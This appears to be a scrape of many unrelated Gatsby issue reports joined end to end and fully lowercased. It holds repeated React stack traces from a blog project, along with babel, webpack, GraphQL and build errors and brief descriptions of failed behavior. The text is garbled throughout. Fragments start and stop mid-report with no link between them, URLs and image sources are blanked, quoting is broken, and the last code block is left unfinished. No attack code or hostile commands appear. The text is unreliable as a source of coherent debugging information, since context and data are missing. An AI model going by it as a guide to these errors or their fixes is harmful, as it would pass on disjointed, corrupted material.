emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/src/templates/blog-post.js:37 uncaught typeerror: cannot read property 'markdownremark' of undefined at blogposttemplate (vm2221 blog-post.js:37) at proxyfacade (d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:675) at mountindeterminatecomponent (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13381) at beginwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13821) at performunitofwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864) at workloop (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903) at htmlunknownelement.callcallback (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100) at object.invokeguardedcallbackdev (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138) at invokeguardedcallback (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187) at replayunitofwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15311) at renderroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15963) at performworkonroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561) at performwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219) at object.enqueuesetstate (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300) at proxycomponent.component.setstate (d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270) at jsonstore._this.handlemittevent (vm2178 json-store.js:46) at eval (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at array.map (<anonymous>) at object.emit (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at r.eval (d:/projects/nicky-blog/.cache/socketio.js:65) at r.emit (index.js:83) at r.onevent (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.ondecoded (index.js:83) at a.<anonymous> (index.js:83) at a.r.emit (index.js:83) at a.add (index.js:83) at r.ondata (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.ondata (index.js:83) at websocket.ws.onmessage (index.js:83)
blogposttemplate @ d:/projects/nicky-blog/src/templates/blog-post.js:37
blogposttemplate @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:675
mountindeterminatecomponent @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13381
beginwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13821
performunitofwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864
workloop @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
replayunitofwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15311
renderroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15963
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172 the above error occurred in the <blogposttemplate> component: in blogposttemplate (created by pagerenderer) in pagerenderer (at json-store.js:93) in jsonstore (created by routehandler) in scrollcontext (at root.js:82) in routehandler (created by root) in div (created by focushandlerimpl) in focushandlerimpl in focushandler (created by routerimpl) in routerimpl (created by locationprovider) in locationprovider in location in router (created by root) in root (created by hotexportedroot) in appcontainer (created by hotexportedroot) in hotexportedroot (at app.js:55) react will try to recreate this component tree from scratch using the error boundary you provided, locationprovider.
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
logcapturederror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14227
logerror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14266
callback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14948
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10879
commitupdatequeue @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10923
commitlifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14378
commitalllifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15463
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
commitroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604
completeroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/@reach/router/es/index.js:123 uncaught typeerror: cannot read property 'markdownremark' of undefined at blogposttemplate (vm2221 blog-post.js:37) at proxyfacade (d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:675) at mountindeterminatecomponent (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13381) at beginwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13821) at performunitofwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864) at workloop (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903) at renderroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15943) at performworkonroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561) at performwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219) at object.enqueuesetstate (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300) at proxycomponent.component.setstate (d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270) at jsonstore._this.handlemittevent (vm2178 json-store.js:46) at eval (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at array.map (<anonymous>) at object.emit (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at r.eval (d:/projects/nicky-blog/.cache/socketio.js:65) at r.emit (index.js:83) at r.onevent (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.ondecoded (index.js:83) at a.<anonymous> (index.js:83) at a.r.emit (index.js:83) at a.add (index.js:83) at r.ondata (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.ondata (index.js:83) at websocket.ws.onmessage (index.js:83)
blogposttemplate @ d:/projects/nicky-blog/src/templates/blog-post.js:37
blogposttemplate @ d:/projects/nicky-blog/node_modules/react-hot-loader/dist/react-hot-loader.development.js:675
mountindeterminatecomponent @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13381
beginwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:13821
performunitofwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15864
workloop @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15903
renderroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15943
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16561
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172 the above error occurred in the <locationprovider> component: in locationprovider in location in router (created by root) in root (created by hotexportedroot) in appcontainer (created by hotexportedroot) in hotexportedroot (at app.js:55) consider adding an error boundary to your tree to customize error handling behavior.
visit to learn more about error boundaries.
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
__stack_frame_overlay_proxy_console__ @ d:/projects/nicky-blog/node_modules/react-error-overlay/lib/index.js:2172
logcapturederror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14227
logerror @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14266
update.callback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14919
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10879
commitupdatequeue @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:10912
commitlifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:14397
commitalllifecycles @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15463
callcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:100
invokeguardedcallbackdev @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:138
invokeguardedcallback @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187
commitroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604
completeroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619
performworkonroot @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564
performwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483
performsyncwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455
requestwork @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355
schedulework$1 @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219
enqueuesetstate @ d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300
component.setstate @ d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270
jsonstore._this.handlemittevent @ vm2178 json-store.js:46
(anonymous) @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
emit @ d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59
(anonymous) @ d:/projects/nicky-blog/.cache/socketio.js:65
r.emit @ index.js:83
r.onevent @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.ondecoded @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
a.add @ index.js:83
r.ondata @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
(anonymous) @ index.js:83
r.emit @ index.js:83
r.onpacket @ index.js:83
r.ondata @ index.js:83
ws.onmessage @ index.js:83
d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:145 uncaught error: a cross-origin error was thrown
react doesn't have access to the actual error object in development
see for more information
at object.invokeguardedcallbackdev (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:145) at invokeguardedcallback (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:187) at commitroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:15604) at completeroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16619) at performworkonroot (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16564) at performwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16483) at performsyncwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16455) at requestwork (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16355) at schedulework$1 (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:16219) at object.enqueuesetstate (d:/projects/nicky-blog/node_modules/react-dom/cjs/react-dom.development.js:11300) at proxycomponent.component.setstate (d:/projects/nicky-blog/node_modules/react/cjs/react.development.js:270) at jsonstore._this.handlemittevent (vm2178 json-store.js:46) at eval (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at array.map (<anonymous>) at object.emit (d:/projects/nicky-blog/node_modules/mitt/dist/mitt.es.js:59) at r.eval (d:/projects/nicky-blog/.cache/socketio.js:65) at r.emit (index.js:83) at r.onevent (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.ondecoded (index.js:83) at a.<anonymous> (index.js:83) at a.r.emit (index.js:83) at a.add (index.js:83) at r.ondata (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.<anonymous> (index.js:83) at r.emit (index.js:83) at r.onpacket (index.js:83) at r.ondata (index.js:83) at websocket.ws.onmessage (index.js:83) </code></pre>
a blank page is ultimately displayed
create-a-gatsby-site pointing to open #create-a-gatsby-site
have a delay, depend on the query size you have, more size or using `withwebp` heavily will increase pausing time
my project have 50+ fluid withwebp per page, the delay would between 2~5s
the site doesn't work offline
warning appears: ```
warning there are conflicting field types in your data
graphql schema will omit those fields.
componentprop.type.value: - type: array<object> value: [ { value: '\\'button\\'', computed: false }, ..
] source: file "conflicting-components/button.jsx" - type: string value: \'date\' source: file "conflicting-components/datepicker.jsx"
componentprop.parenttype.value: - type: array<object> value: [ { value: '\\'button\\'', computed: false }, ..
] source: file "conflicting-components/button.jsx" - type: string value: \'date\' source: file "conflicting-components/datepicker.jsx"
nothing happens
## how to fix after lands, we should investigate adding remembering the hash scroll position in either gatsby-react-router-scroll or in the new top-level `routehandler` component.
this never completes and there are no error messages whatsoever
building production javascript and css bundles
`quality` is ignored
if you remove the `duotone` parameter, `quality` is honored.
`typeerror: history.replace is not a function` error throws
links are overridden with a link to the image
(actually, they're double-wrapped, but the html parser drops the outer link.)
no link headers are added from allpageheaders
the source code will have the ga snippet with `ga('set', 'anonymizeip', 1); ` statement.
errors for all files in /pages and /templates for example:
error: enoent: no such file or directory, open '/users/isabellachen/developer/ projects/my-default-project/.cache/dev-404-page.js' error there was a problem reading the file: /users/isabellachen/developer/projects/my-default-project/src/pages/404.js
it seems that the `allmyitemsjson` object is undefined when i run `gatsby build`
error there was a problem loading the local develop command
gatsby may not be installed
perhaps you need to run "npm install"?
"hello" renders in black clearly indicating that the style is not applied.
it's crashing.
google fonts are not loaded in develop mode.
i only got a white page with the words __"loading (staticquery)"__ on it (no errors in console).
fails to build
gatsby develop stops and the following error shows:
typeerror: cannot destructure property `parentspan` of 'undefined' or 'null'.
mysterious hang on build
no change appears in the browser.
> the new node didn't pass validation
validationerror: child "internal" fails because [child "owner" fails because ["owner" is required]]
receive the following error: ``` error: ./.cache/production-app.js module build failed (from ./node_modules/babel-loader/lib/index.js): error: [babel] /applications/mamp/htdocs/nv2/.cache/production-app.js: invalid option: sourcetype is not a valid t op-level option
maybe you meant to use \'exclude\'? (while processing: "/applications/mamp/htdocs/nv2/node_modules/@babel/pr eset-env/lib/index.js") at validatetopleveloptions (/applications/mamp/htdocs/nv2/node_modules/@babel/preset-env/lib/normalize-options .js:47:13) at normalizeoptions (/applications/mamp/htdocs/nv2/node_modules/@babel/preset-env/lib/normalize-options.js:149 :3) at _default (/applications/mamp/htdocs/nv2/node_modules/@babel/preset-env/lib/index.js:164:37) at /applications/mamp/htdocs/nv2/node_modules/@babel/helper-plugin-utils/lib/index.js:19:12 at loaddescriptor (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/config/full.js:157:14) at cachedfunction (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/config/caching.js:32:19) at loadpresetdescriptor (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/config/full.js:227:63) at config.presets.map.descriptor (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/config/full.js:72 :19) at array.map (<anonymous>) at recursedescriptors (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/config/full.js:70:38) at loadfullconfig (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/config/full.js:100:6) at transformsync (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/transform.js:41:38) at object.transform (/applications/mamp/htdocs/nv2/node_modules/@babel/core/lib/transform.js:22:38) at transpile (/applications/mamp/htdocs/nv2/node_modules/babel-loader/lib/index.js:55:20) at /applications/mamp/htdocs/nv2/node_modules/babel-loader/lib/fs-cache.js:116:18 at readfilecontext.callback (/applications/mamp/htdocs/nv2/node_modules/babel-loader/lib/fs-cache.js:36:21) at fsreqwrap.readfileafteropen [as oncomplete] (fs.js:437:13)
when i change my styles in a `.css` file, the changes are hot reloaded and can be seen on screen immediately
when i modify the styles of a react components using an inline style block or styled-components, the style change is only reflect in the browser when i interact with the page or performa full reload.
site compiles but `<div id="___gatsby"></div>` has no children.
it scrolls to the top
this will not happen if js is disabled.
error unhandled rejection typeerror: store.getstate(...).pages.filter is not a function - page-hot-reloader.js:65 [website]/[gatsby]/dist/bootstrap/page-hot-reloader.js:65:28
only `custom-block` is added
i received `loading (static query)`
throws error: > **graphql error** there was an error while compiling your site's graphql queries
invariant violation: graphqlcompilercontext: duplicate document named `titlequery`
graphql fragments and roots must have unique names.
no errors are shown when creating the pages.
the url is listed in the 404 page but there's no page being created
the opposite of expected.
a 404 page is shown.
success building production javascript and css bundles 4.523 s error building static html for pages failed see our docs page on debugging html builds for help 61 | object.defineproperty(ns, 'default', { enumerable: true, value: value }); 62 | if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
> 63 | return ns; | ^ 64 | }; 65 | 66 | // getdefaultexport function for compatibility with non-harmony modules webpackerror: ./src/components/style.module.css ```
throws an error.
content underneath the **reference** heading appears to be cutoff, and i was unable to see what that additional content/search results might be.
when using css, v2 offers an inconsistent experience in development vs
production by switching between inlining and not-inlining css styles
(if i've misunderstood any of this, please let me know!)
graphql fragments/queries aren't processed when semicolons don't exist, and page shows up the loading message.
navigation is not working and it's throwing this error on the console.
react-dom.production.min.js:17 uncaught typeerror: window.___navigateto is not a function at object.onclick (index.js:206) at r.handleclick (link.js:37) at object.<anonymous> (react-dom.production.min.js:15) at object.invokeguardedcallback (react-dom.production.min.js:16)
unhandled promise rejection referenceerror: \'promise\' is undefined "unhandled promise rejection" { [functions]: , __proto__: { }, description: "\'promise\' is undefined", message: "\'promise\' is undefined", name: "referenceerror", number: -2146823279, stack: "referenceerror: \'promise\' is undefined at t.components.component---src-pages-index-js ( at anonymous function ( at o ( at s ( at e ( at a.getresourcesforpathname ( at anonymous function ( at a ( at anonymous function ( at c ( " }
the query result has errors such as:
{ "errors": [ { "message": "int cannot represent non 32-bit signed integer value: 3000000000", "locations": [ { "line": 6, "column": 7 } ], "path": [ "alldatajson", "edges", 0, "node", "value" ] } ], "data": { "alldatajson": { "edges": [ { "node": { "id": "26dc3246-8f8e-5d5b-8fab-72565b563d30", "value": null } } ] } }
it just errs out during the build
#### chrome
<img width="1619" alt="screen shot 2018-06-18 at 8 11 36 pm" src=" "> <img width="1303" alt="screen shot 2018-06-18 at 8 13 06 pm" src=" "> #### lighthouse
<img width="718" alt="screen shot 2018-06-18 at 8 12 23 pm" src=" ">
`result.data.projects.edges` is null
the fragments have to be updated manually.
ps: i have actually tried removing that `hello-world-banner.jpg` image
then it just fails on another image
i kept on removing until there's no image left
then of course it worked
for now, i have set netlify build command `yarn build || true` which just ignores the error and deploys anyway
you can it working good just here
a blank page with http status 404.
success write out redirect data 0.001 s
success onpostbootstrap 0.001 s info bootstrap finished - 5.813 s warning compiled with 1 warnings 16:30:27 warning in ./~/netlify-cms/dist/cms.js critical dependencies:
42:378-385 this seems to be a pre-built javascript file
though this is possible, it's not recommended
try to require the original source to get better results
@ ./~/netlify-cms/dist/cms.js 42:378-385 wait compiling..
16:30:27 warning compiled with 1 warnings 16:30:28 warning in ./~/netlify-cms/dist/cms.js critical dependencies:
42:378-385 this seems to be a pre-built javascript file
though this is possible, it's not recommended
try to require the original source to get better results
@ ./~/netlify-cms/dist/cms.js 42:378-385
after navigation, nothing happens.
running `gatsby build && gatsby serve` and accessing nonexistent route yields such results:
![screenshot from 2018-05-21 19-01-21](
if the first result is an int, gatsby infers that its an int, not a float
/search (and every other url for that matter) renders index.js
news items don't get displayed (as shown above).
safari flashes maybe once, firefox continues to flash as if it was continuously refreshing the page, and chrome flashes a couple of times.
the build fails with the following error: ``` referenceerror: window is not defined - render-page.js:1558 object../gatsby-browser.js /gatsby-v2/examples/gatsbygram/public/render-page.js:1558:19 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:114 object../.cache/api-runner-browser-plugins.js /gatsby-v2/examples/gatsbygram/public/render-page.js:114:11 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:131 object../.cache/api-runner-browser.js /gatsby-v2/examples/gatsbygram/public/render-page.js:131:15 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:860 object../.cache/loader.js /gatsby-v2/examples/gatsbygram/public/render-page.js:860:78 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:659 object.<anonymous> /gatsby-v2/examples/gatsbygram/public/render-page.js:659:65 - render-page.js:691 object../.cache/gatsby-browser-entry.js /gatsby-v2/examples/gatsbygram/public/render-page.js:691:30 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:7564 object../node_modules/gatsby-plugin-manifest/gatsby-ssr.js /gatsby-v2/examples/gatsbygram/public/render-page.js:7564:15 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:179 object../.cache/api-runner-ssr.js /gatsby-v2/examples/gatsbygram/public/render-page.js:179:11 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:439 object.<anonymous> /gatsby-v2/examples/gatsbygram/public/render-page.js:439:73 - render-page.js:532 object../.cache/develop-static-entry.js /gatsby-v2/examples/gatsbygram/public/render-page.js:532:30 - render-page.js:30 __webpack_require__ /gatsby-v2/examples/gatsbygram/public/render-page.js:30:30 - render-page.js:79 /gatsby-v2/examples/gatsbygram/public/render-page.js:79:18 - render-page.js:82 /gatsby-v2/examples/gatsbygram/public/render-page.js:82:10 - render-page.js:3 webpackuniversalmoduledefinition /gatsby-v2/examples/gatsbygram/public/render-page.js:3:20 - render-page.js:10 object.<anonymous> /gatsby-v2/examples/gatsbygram/public/render-page.js:10:3
the iframe is rendered within the codeblock
### workaround add a language to the codeblock:
<iframe src=" " frameborder="0" allowfullscreen></iframe>
``` ### notes this doesn't happen unless `gatsby-remark-prismjs` is installed.
validationerror: child "id" fails because ["id" must be a string]
they are all left-aligned.
only the hard-coded values were included.
/users/nratter/development/jw.com-gatsby/node_modules/serve/bin/serve.js:83
detect(port).then(async open => { ^^^^^
syntaxerror: missing ) after argument list at createscript (vm.js:56:10) at object.runinthiscontext (vm.js:97:10) at module._compile (module.js:542:28) at object.module._extensions..js (module.js:579:10) at module.load (module.js:487:32) at trymoduleload (module.js:446:12) at function.module._load (module.js:438:3) at module.runmain (module.js:604:10) at run (bootstrap_node.js:389:7) at startup (bootstrap_node.js:149:9)
gatsby serve generates the following error and site is not accessible at
{ error: command failed: xsel --clipboard --input
xsel: can't open display: (null)
: inappropriate ioctl for device at promise.all.then.arr (/home/hansifer/sites/blog/node_modules/clipboardy/node_modules/execa/index.js:236:11) at <anonymous> at process._tickcallback (internal/process/next_tick.js:182:7) code: 1, killed: false, stdout: '', stderr: 'xsel: can\\'t open display: (null)\ : inappropriate ioctl for device\ ', failed: true, signal: null, cmd: 'xsel --clipboard --input', timedout: false }
![image](
in demo page, images in **resize** part is not rotated.
blog post goes blank after a few save/edits
however, `git checkout` the last commit before `head` (`a13b5b8d`) doesn't cause this problem so the problem must be in the `gatsby-plugin-remove-trailing-slashes` plugin.
the page does not load
nothing happens
the search results panel does not re-open
{ "errors": [ { "message": "variable \\"$tag\\" of type \\"string\\" used in position expecting type \\"contentjsonconnectiontopicsinputobject_2\\".", "locations": [ { "line": 1, "column": 56 }, { "line": 2, "column": 67 } ] } ]
``` the only way i've found to get the query to run is this: ```
